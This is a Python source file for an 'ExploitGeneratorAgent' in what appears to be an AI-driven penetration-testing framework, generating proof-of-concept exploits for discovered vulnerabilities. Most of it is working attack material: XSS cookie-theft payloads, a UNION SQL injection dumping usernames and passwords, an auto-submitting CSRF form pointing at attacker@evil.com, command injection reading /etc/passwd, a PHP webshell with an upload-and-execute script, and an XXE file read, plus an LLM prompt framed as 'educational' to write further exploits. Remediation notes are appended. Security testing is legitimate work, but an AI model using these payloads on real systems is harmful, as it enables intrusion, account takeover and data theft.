"""
Exploit Generator Agent - PoC Exploit Code Generation
Generates working proof-of-concept exploits for discovered vulnerabilities
"""

from typing import Dict, Any, List, Optional
from datetime import datetime
import json

from core.agent import BaseAgent
from core.memory import Finding
from utils.logger import get_logger


class ExploitGeneratorAgent(BaseAgent):
    """Agent that generates proof-of-concept exploit code"""
    
    def __init__(self, config, gemini_client, memory):
        super().__init__("ExploitGenerator", config, gemini_client, memory)
        
        # Exploit templates
        self.exploit_templates = {
            "xss": self._generate_xss_exploit,
            "sqli": self._generate_sqli_exploit,
            "csrf": self._generate_csrf_exploit,
            "command_injection": self._generate_command_injection_exploit,
            "file_upload": self._generate_file_upload_exploit,
            "xxe": self._generate_xxe_exploit,
        }
    
    async def execute(self, **kwargs) -> Dict[str, Any]:
        """Execute exploit generation"""
        finding = kwargs.get("finding")
        if not finding:
            raise ValueError("Finding is required for exploit generation")
        
        return await self.generate_poc(finding)
    
    async def generate_poc(self, finding: Finding) -> Dict[str, Any]:
        """
        Generate proof-of-concept exploit for a finding
        
        Args:
            finding: Security finding to generate exploit for
            
        Returns:
            Dict with exploit code, steps, and metadata
        """
        self.log_action("GeneratingExploit", f"Creating PoC for {finding.title}")
        
        # Detect vulnerability type
        vuln_type = self._detect_vuln_type(finding)
        
        # Generate exploit using template or AI
        if vuln_type in self.exploit_templates:
            exploit = await self.exploit_templates[vuln_type](finding)
        else:
            # Use AI to generate custom exploit
            exploit = await self._generate_ai_exploit(finding)
        
        # Enrich with metadata
        exploit["finding_id"] = finding.id
        exploit["generated_at"] = datetime.now().isoformat()
        exploit["cvss_score"] = self._calculate_cvss(finding, exploit)
        
        self.log_action("ExploitGenerated", f"PoC ready for {vuln_type}")
        
        return exploit
    
    def _detect_vuln_type(self, finding: Finding) -> str:
        """Detect vulnerability type from finding"""
        title_lower = finding.title.lower()
        desc_lower = finding.description.lower()
        
        if "xss" in title_lower or "cross-site scripting" in desc_lower:
            return "xss"
        elif "sql" in title_lower or "injection" in title_lower:
            return "sqli"
        elif "csrf" in title_lower or "cross-site request" in desc_lower:
            return "csrf"
        elif "command injection" in title_lower or "rce" in title_lower:
            return "command_injection"
        elif "file upload" in title_lower:
            return "file_upload"
        elif "xxe" in title_lower or "xml external" in desc_lower:
            return "xxe"
        else:
            return "unknown"
    
    async def _generate_xss_exploit(self, finding: Finding) -> Dict[str, Any]:
        """Generate XSS exploit"""
        
        # Extract context from finding
        evidence = finding.evidence or ""
        target_url = finding.target
        
        # Determine XSS context
        if "attribute" in evidence.lower():
            context = "attribute"
            payloads = [
                '" onload="alert(document.cookie)',
                "' onload='alert(document.cookie)",
                '" autofocus onfocus="alert(1)',
            ]
        elif "script" in evidence.lower():
            context = "script"
            payloads = [
                "</script><script>alert(document.cookie)</script>",
                "';alert(document.cookie);//",
            ]
        else:
            context = "html"
            payloads = [
                "<script>alert(document.cookie)</script>",
                "<img src=x onerror=alert(document.cookie)>",
                "<svg onload=alert(document.cookie)>",
            ]
        
        # Select best payload
        payload = payloads[0]
        
        # Generate full exploit URL
        if "?" in target_url:
            exploit_url = f"{target_url}&q={payload}"
        else:
            exploit_url = f"{target_url}?q={payload}"
        
        # Generate Python PoC
        python_code = f"""#!/usr/bin/env python3
\"\"\"
XSS Exploit PoC
Target: {target_url}
Context: {context}
\"\"\"

import requests
from urllib.parse import quote

# Payload
payload = "{payload}"

# Target URL
url = "{target_url}"

# Craft exploit
params = {{"q": payload}}

# Send request
response = requests.get(url, params=params)

print(f"Status Code: {{response.status_code}}")
print(f"Payload reflected: {{payload in response.text}}")

# Full exploit URL
exploit_url = "{exploit_url}"
print(f"\\nExploit URL:\\n{{exploit_url}}")
"""
        
        # Generate cURL command
        curl_cmd = f"curl '{exploit_url}'"
        
        # Generate exploitation steps
        steps = [
            f"1. Navigate to {target_url}",
            f"2. Inject payload: {payload}",
            "3. Observe JavaScript execution (alert box with cookies)",
            "4. Steal session cookies or perform actions on behalf of user",
        ]
        
        # Generate impact analysis
        impact = """
**Impact:**
- Session hijacking via cookie theft
- Keylogging and credential theft
- Phishing attacks
- Malware distribution
- Defacement

**Attack Scenario:**
1. Attacker crafts malicious URL with XSS payload
2. Victim clicks the link (via phishing, social engineering)
3. JavaScript executes in victim's browser
4. Attacker steals session cookies
5. Attacker impersonates victim
"""
        
        return {
            "type": "xss",
            "context": context,
            "payload": payload,
            "exploit_url": exploit_url,
            "python_code": python_code,
            "curl_command": curl_cmd,
            "steps": steps,
            "impact": impact,
            "severity": "high",
            "remediation": self._get_xss_remediation(),
        }
    
    async def _generate_sqli_exploit(self, finding: Finding) -> Dict[str, Any]:
        """Generate SQL Injection exploit"""
        
        target_url = finding.target
        
        # SQL injection payloads
        payloads = {
            "union": "' UNION SELECT NULL,username,password FROM users--",
            "boolean": "' OR '1'='1",
            "time": "' OR SLEEP(5)--",
            "error": "' AND 1=CONVERT(int, (SELECT @@version))--",
        }
        
        # Determine injection type
        injection_type = "union"  # Default
        payload = payloads[injection_type]
        
        # Generate Python PoC
        python_code = f"""#!/usr/bin/env python3
\"\"\"
SQL Injection Exploit PoC
Target: {target_url}
Type: {injection_type.upper()}-based
\"\"\"

import requests

# Target URL
url = "{target_url}"

# SQL Injection payload
payload = "{payload}"

# Craft exploit
params = {{"id": payload}}

# Send request
response = requests.get(url, params=params)

print(f"Status Code: {{response.status_code}}")
print(f"Response Length: {{len(response.text)}}")
print("\\nResponse Preview:")
print(response.text[:500])

# Check for SQL errors
if "sql" in response.text.lower() or "mysql" in response.text.lower():
    print("\\n[!] SQL error detected - vulnerable!")
"""
        
        # Generate sqlmap command
        sqlmap_cmd = f"sqlmap -u '{target_url}?id=1' --batch --dbs"
        
        # Exploitation steps
        steps = [
            f"1. Identify injectable parameter in {target_url}",
            f"2. Test with payload: {payload}",
            "3. Confirm SQL injection via error messages or behavior",
            "4. Use sqlmap for automated exploitation:",
            f"   {sqlmap_cmd}",
            "5. Extract database names, tables, and data",
        ]
        
        # Impact analysis
        impact = """
**Impact:**
- Complete database compromise
- Data exfiltration (user credentials, PII, etc.)
- Authentication bypass
- Data manipulation/deletion
- Potential OS command execution

**Attack Scenario:**
1. Attacker identifies SQL injection point
2. Extracts database schema
3. Dumps user credentials
4. Gains administrative access
5. Exfiltrates sensitive data
"""
        
        return {
            "type": "sqli",
            "injection_type": injection_type,
            "payload": payload,
            "python_code": python_code,
            "sqlmap_command": sqlmap_cmd,
            "steps": steps,
            "impact": impact,
            "severity": "critical",
            "remediation": self._get_sqli_remediation(),
        }
    
    async def _generate_csrf_exploit(self, finding: Finding) -> Dict[str, Any]:
        """Generate CSRF exploit"""
        
        target_url = finding.target
        
        # Generate HTML PoC
        html_code = f"""<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC</title>
</head>
<body>
    <h1>CSRF Exploit - Auto-submitting...</h1>
    
    <form id="csrf-form" action="{target_url}" method="POST">
        <input type="hidden" name="email" value="attacker@evil.com">
        <input type="hidden" name="password" value="hacked123">
        <input type="submit" value="Submit">
    </form>
    
    <script>
        // Auto-submit form
        document.getElementById('csrf-form').submit();
    </script>
</body>
</html>
"""
        
        # Exploitation steps
        steps = [
            "1. Host the CSRF HTML page on attacker-controlled server",
            "2. Trick victim into visiting the malicious page",
            "3. Form auto-submits to target application",
            "4. Action performed on behalf of victim (e.g., change email/password)",
        ]
        
        # Impact
        impact = """
**Impact:**
- Unauthorized state-changing operations
- Account takeover
- Data modification
- Privilege escalation

**Attack Scenario:**
1. Victim is logged into vulnerable application
2. Attacker sends phishing email with malicious link
3. Victim clicks link
4. CSRF payload executes
5. Victim's account is compromised
"""
        
        return {
            "type": "csrf",
            "html_code": html_code,
            "steps": steps,
            "impact": impact,
            "severity": "medium",
            "remediation": self._get_csrf_remediation(),
        }
    
    async def _generate_command_injection_exploit(self, finding: Finding) -> Dict[str, Any]:
        """Generate Command Injection exploit"""
        
        target_url = finding.target
        
        # Command injection payloads
        payloads = [
            "; cat /etc/passwd",
            "| whoami",
            "`id`",
            "$(cat /etc/passwd)",
        ]
        
        payload = payloads[0]
        
        # Python PoC
        python_code = f"""#!/usr/bin/env python3
\"\"\"
Command Injection Exploit PoC
Target: {target_url}
\"\"\"

import requests

# Target URL
url = "{target_url}"

# Command injection payload
payload = "{payload}"

# Craft exploit
params = {{"cmd": payload}}

# Send request
response = requests.get(url, params=params)

print(f"Status Code: {{response.status_code}}")
print("\\nResponse:")
print(response.text)

# Check for command output
if "root:" in response.text or "uid=" in response.text:
    print("\\n[!] Command injection successful!")
"""
        
        steps = [
            f"1. Identify command injection point in {target_url}",
            f"2. Inject payload: {payload}",
            "3. Observe command output in response",
            "4. Escalate to reverse shell if needed",
        ]
        
        impact = """
**Impact:**
- Remote code execution
- Complete server compromise
- Data exfiltration
- Lateral movement
- Denial of service

**Attack Scenario:**
1. Attacker finds command injection vulnerability
2. Executes system commands
3. Establishes reverse shell
4. Escalates privileges
5. Compromises entire server
"""
        
        return {
            "type": "command_injection",
            "payload": payload,
            "python_code": python_code,
            "steps": steps,
            "impact": impact,
            "severity": "critical",
            "remediation": self._get_command_injection_remediation(),
        }
    
    async def _generate_file_upload_exploit(self, finding: Finding) -> Dict[str, Any]:
        """Generate File Upload exploit"""
        
        # PHP webshell
        webshell_code = """<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
"""
        
        # Python upload script
        python_code = f"""#!/usr/bin/env python3
\"\"\"
File Upload Exploit PoC
Target: {finding.target}
\"\"\"

import requests

# Target upload endpoint
url = "{finding.target}"

# Malicious PHP webshell
webshell = '''<?php
if(isset($_REQUEST['cmd'])){{
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}}
?>'''

# Upload file
files = {{'file': ('shell.php', webshell, 'application/x-php')}}
response = requests.post(url, files=files)

print(f"Upload Status: {{response.status_code}}")
print(f"Response: {{response.text}}")

# Access webshell
shell_url = url.replace('/upload', '/uploads/shell.php')
cmd_response = requests.get(shell_url, params={{'cmd': 'whoami'}})
print(f"\\nWebshell output:\\n{{cmd_response.text}}")
"""
        
        steps = [
            "1. Create malicious PHP webshell",
            "2. Upload file to vulnerable endpoint",
            "3. Access uploaded file via web browser",
            "4. Execute system commands through webshell",
            "5. Establish persistent access",
        ]
        
        return {
            "type": "file_upload",
            "webshell_code": webshell_code,
            "python_code": python_code,
            "steps": steps,
            "impact": "Remote code execution, complete server compromise",
            "severity": "critical",
            "remediation": self._get_file_upload_remediation(),
        }
    
    async def _generate_xxe_exploit(self, finding: Finding) -> Dict[str, Any]:
        """Generate XXE exploit"""
        
        # XXE payload
        xxe_payload = """<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
    <data>&xxe;</data>
</root>
"""
        
        # Python PoC
        python_code = f"""#!/usr/bin/env python3
\"\"\"
XXE Exploit PoC
Target: {finding.target}
\"\"\"

import requests

# Target URL
url = "{finding.target}"

# XXE payload
payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
    <data>&xxe;</data>
</root>'''

# Send XXE payload
headers = {{'Content-Type': 'application/xml'}}
response = requests.post(url, data=payload, headers=headers)

print(f"Status Code: {{response.status_code}}")
print("\\nResponse:")
print(response.text)

# Check for file content
if "root:" in response.text:
    print("\\n[!] XXE successful - /etc/passwd retrieved!")
"""
        
        return {
            "type": "xxe",
            "payload": xxe_payload,
            "python_code": python_code,
            "steps": [
                "1. Identify XML parsing endpoint",
                "2. Inject XXE payload",
                "3. Read sensitive files (/etc/passwd, etc.)",
                "4. Exfiltrate data via out-of-band techniques",
            ],
            "impact": "File disclosure, SSRF, denial of service",
            "severity": "high",
            "remediation": self._get_xxe_remediation(),
        }
    
    async def _generate_ai_exploit(self, finding: Finding) -> Dict[str, Any]:
        """Use AI to generate custom exploit for unknown vulnerability types"""
        
        prompt = f"""Generate a proof-of-concept exploit for the following vulnerability:

Title: {finding.title}
Description: {finding.description}
Evidence: {finding.evidence}
Target: {finding.target}

Provide:
1. Exploit payload
2. Python PoC code
3. Step-by-step exploitation guide
4. Impact analysis
5. Remediation steps

Format as JSON with keys: payload, python_code, steps, impact, remediation
"""
        
        result = await self.think(
            prompt,
            "You are a security researcher creating educational PoC exploits for vulnerability remediation."
        )
        
        try:
            exploit_data = json.loads(result["response"])
        except:
            exploit_data = {
                "payload": "Custom payload needed",
                "python_code": "# AI-generated exploit code\n" + result["response"],
                "steps": ["See AI-generated instructions"],
                "impact": "See finding description",
                "remediation": finding.remediation or "Apply security best practices",
            }
        
        return exploit_data
    
    def _calculate_cvss(self, finding: Finding, exploit: Dict[str, Any]) -> float:
        """Calculate CVSS score based on finding and exploit"""
        severity_scores = {
            "critical": 9.0,
            "high": 7.5,
            "medium": 5.0,
            "low": 3.0,
            "info": 1.0,
        }
        return severity_scores.get(finding.severity.lower(), 5.0)
    
    # Remediation templates
    def _get_xss_remediation(self) -> str:
        return """
**Remediation Steps:**

1. **Input Validation:**
   - Validate all user input against whitelist
   - Reject unexpected characters

2. **Output Encoding:**
   - HTML encode: `htmlspecialchars($input, ENT_QUOTES, 'UTF-8')`
   - JavaScript encode: Use proper escaping libraries
   - URL encode: `encodeURIComponent()`

3. **Content Security Policy:**
   - Implement CSP header
   - `Content-Security-Policy: default-src 'self'`

4. **HTTPOnly Cookies:**
   - Set HTTPOnly flag on session cookies
   - Prevents JavaScript access to cookies

**Code Example (PHP):**
```php
// Before (vulnerable)
echo $_GET['search'];

// After (secure)
echo htmlspecialchars($_GET['search'], ENT_QUOTES, 'UTF-8');
```
"""
    
    def _get_sqli_remediation(self) -> str:
        return """
**Remediation Steps:**

1. **Use Prepared Statements:**
   ```php
   // Vulnerable
   $query = "SELECT * FROM users WHERE id = " . $_GET['id'];
   
   // Secure
   $stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
   $stmt->execute([$_GET['id']]);
   ```

2. **Input Validation:**
   - Validate data types
   - Use whitelist validation

3. **Least Privilege:**
   - Database user should have minimal permissions
   - No DROP, CREATE permissions for app user

4. **WAF/IDS:**
   - Deploy Web Application Firewall
   - Monitor for SQL injection patterns
"""
    
    def _get_csrf_remediation(self) -> str:
        return """
**Remediation Steps:**

1. **CSRF Tokens:**
   - Generate unique token per session
   - Include in all state-changing forms
   - Validate on server-side

2. **SameSite Cookies:**
   - Set `SameSite=Strict` or `SameSite=Lax`

3. **Double Submit Cookie:**
   - Send token in both cookie and request parameter
   - Verify they match

4. **Custom Headers:**
   - Require custom header for AJAX requests
   - `X-Requested-With: XMLHttpRequest`
"""
    
    def _get_command_injection_remediation(self) -> str:
        return """
**Remediation Steps:**

1. **Avoid System Calls:**
   - Use language built-in functions instead
   - Never pass user input to shell

2. **Input Validation:**
   - Strict whitelist validation
   - Reject special characters: `;|&$()` etc.

3. **Escaping:**
   - Use `escapeshellarg()` and `escapeshellcmd()` (PHP)
   - Properly quote arguments

4. **Sandboxing:**
   - Run processes with minimal privileges
   - Use containers/chroot
"""
    
    def _get_file_upload_remediation(self) -> str:
        return """
**Remediation Steps:**

1. **File Type Validation:**
   - Check MIME type server-side
   - Verify file extension against whitelist
   - Use magic bytes validation

2. **Rename Files:**
   - Generate random filenames
   - Remove user-controlled names

3. **Storage Location:**
   - Store outside web root
   - Serve via download script

4. **Execution Prevention:**
   - Disable script execution in upload directory
   - `.htaccess`: `php_flag engine off`
"""
    
    def _get_xxe_remediation(self) -> str:
        return """
**Remediation Steps:**

1. **Disable External Entities:**
   ```php
   libxml_disable_entity_loader(true);
   ```

2. **Use Safe Parsers:**
   - Configure XML parser to reject DTDs
   - Disable external entity resolution

3. **Input Validation:**
   - Validate XML structure
   - Reject DOCTYPE declarations

4. **Use JSON:**
   - Prefer JSON over XML when possible
"""
